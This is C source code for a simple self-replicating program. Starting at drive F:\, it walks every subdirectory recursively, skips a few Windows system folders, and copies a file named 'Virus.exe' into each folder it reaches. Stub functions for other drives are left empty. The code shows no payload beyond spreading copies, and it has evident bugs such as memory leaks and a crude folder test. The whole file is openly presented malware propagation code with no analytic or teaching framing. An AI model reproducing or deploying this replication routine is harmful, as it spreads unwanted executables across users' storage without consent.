#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<dirent.h>
char *addstring(char *str1,char *str2)
{
    int len1=strlen(str1);
    int len2=strlen(str2);
    char *str;
    int i,j,k;
    str=(char *)malloc((len1+len2+1)*sizeof(char));
    for(i=0;i<len1;i++)
    {
        str[i]=str1[i];
    }
    for(j=i,k=0;k<len2;j++,k++)
    {
        str[j]=str2[k];
    }
    str[j]='\0';
    return str;
}
int copy(char *str)
{
    FILE *fp1,*fp2;
    fp1=fopen("Virus.exe","rb");
    char *str1,c;
    int s=8;
    str1=addstring(str,"Virus.exe");
    //printf("%s\n",str1);
    fp2=fopen(str1,"wb");
    if(fp2==NULL)
    {
       // printf("Error1.\n");
        return 1;
    }
    while(s>0 && !feof(fp1))
    {
        s=fscanf(fp1,"%c",&c);
        if(s>0)
        {
            fprintf(fp2,"%c",c);
        }
    }
    fclose(fp2);
    rewind(fp1);
    return 0;
}
int fileorfolder(char *str)
{
    int i,len;
    len=strlen(str);
    if(strcmp(str,".")==0)
    {
        return 1;
    }
    else if(strcmp(str,"..")==0)
    {
        return 1;
    }
    else
    {
        for(i=0;i<len;i++)
        {
            if(str[i]=='.')
            {
                return 1;
            }
        }
    }
    return 0;
}
void replicate_d(char *str1)
{
    DIR *di;
    char *str,*str2;
    struct dirent *ent;
    str2=addstring(str1,"\0");
    di=opendir(str1);
    int s;
    if(di==NULL)
    {
        printf("Error2\n");
    }
    while((ent=readdir(di))!=NULL)
    {
       // printf("%s\n",ent->d_name);
        if(strcmp(ent->d_name,"$RECYCLE.BIN")==0 || strcmp(ent->d_name,"Config.Msi")==0 || strcmp(ent->d_name,"System Volume Information")==0)
        {
            continue;
        }
        if(fileorfolder(ent->d_name)==0)
        {
            s=copy(str2);
            if(s==1)
            {

            }
            str=addstring(str1,ent->d_name);
            str2=addstring(str,"\\");
            replicate_d(str2);
        }
    }
    copy(str2);
}
void replicate_e()
{

}
void replicate_f()
{

}
int main()
{
    replicate_d("F:\\");
    getchar();
    return 0;
}
